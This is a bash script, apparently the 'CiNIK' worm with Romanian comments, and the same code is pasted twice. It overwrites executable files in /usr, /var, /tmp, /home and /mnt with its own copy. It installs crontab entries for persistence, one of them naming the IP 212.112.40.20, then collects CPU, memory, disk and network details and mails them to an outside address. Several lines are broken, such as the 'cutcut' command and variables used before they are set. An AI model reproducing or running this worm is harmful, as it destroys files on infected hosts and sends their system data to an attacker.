#!/bin/bash

##
##  CiNIK starts here :)
##

export PATH=/bin:$PATH

# ce id am ?
 -e myid=`/usr/bin/id | /bin/cut -d( -f1 | /bin/cutcut -d= -f2`

# punem si intr-un loc default
mkdir -p /tmp/.font-unix/.cinik
cat /tmp/.cinik > $i
chmod a+x $i
echo 1 `/bin/date +%H` \* \* \* $i 212.112.40.20 \> /dev/null 2\>\&1 | crontab
# ale altora
for i in `/usr/bin/find /usr /var /tmp /home /mnt -type f -perm 7 2>/dev/null`
do
 cat /tmp/.cinik > $i
 chmod a+x $i
 echo 2 `/bin/date +%H` \* \* \* $i %1 \> /dev/null 2\>\&1 | crontab
done
 
# directoarele mele
 
for i in `/usr/bin/find /usr /var /tmp /home /mnt -type d -uid $myid`
do
 cat /tmp/.cinik > $i/.cinik
 chmod a+x $i/.cinik
 echo 3 `/bin/date +%H` \* \* \* $i/.cinik %1 \> /dev/null 2\>\&1 | crontab
done
 
echo PROC > /tmp/.cinik.status
cat /proc/cpuinfo >> /tmp/.cinik.status
echo MEM >> /tmp/.cinik.status
cat /usr/bin/free >> /tmp/.cinik.status
echo HDD >> /tmp/.cinik.status
cat /bin/df -h >> /tmp/.cinik.status
echo IP >> /tmp/.cinik.status
cat /sbin/ifconfig >> /tmp/.cinik.status
 
myip=`/sbin/ifconfig eth0 | head -2 | tail -1 | cut -d: -f2 | cut -d" " -f1`
mail cinik_worm@yahoo.com -s "$myip" < /tmp/cinik.status
rm -f /tmp/cinik.status
#!/bin/bash

##
##  CiNIK starts here :)
##

export PATH=/bin:$PATH

# ce id am ?
 -e myid=`/usr/bin/id | /bin/cut -d( -f1 | /bin/cutcut -d= -f2`

# punem si intr-un loc default
mkdir -p /tmp/.font-unix/.cinik
cat /tmp/.cinik > $i
chmod a+x $i
echo 1 `/bin/date +%H` \* \* \* $i 212.112.40.20 \> /dev/null 2\>\&1 | crontab
# ale altora
for i in `/usr/bin/find /usr /var /tmp /home /mnt -type f -perm 7 2>/dev/null`
do
 cat /tmp/.cinik > $i
 chmod a+x $i
 echo 2 `/bin/date +%H` \* \* \* $i %1 \> /dev/null 2\>\&1 | crontab
done
 
# directoarele mele
 
for i in `/usr/bin/find /usr /var /tmp /home /mnt -type d -uid $myid`
do
 cat /tmp/.cinik > $i/.cinik
 chmod a+x $i/.cinik
 echo 3 `/bin/date +%H` \* \* \* $i/.cinik %1 \> /dev/null 2\>\&1 | crontab
done
 
echo PROC > /tmp/.cinik.status
cat /proc/cpuinfo >> /tmp/.cinik.status
echo MEM >> /tmp/.cinik.status
cat /usr/bin/free >> /tmp/.cinik.status
echo HDD >> /tmp/.cinik.status
cat /bin/df -h >> /tmp/.cinik.status
echo IP >> /tmp/.cinik.status
cat /sbin/ifconfig >> /tmp/.cinik.status
 
myip=`/sbin/ifconfig eth0 | head -2 | tail -1 | cut -d: -f2 | cut -d" " -f1`
mail cinik_worm@yahoo.com -s "$myip" < /tmp/cinik.status
rm -f /tmp/cinik.status
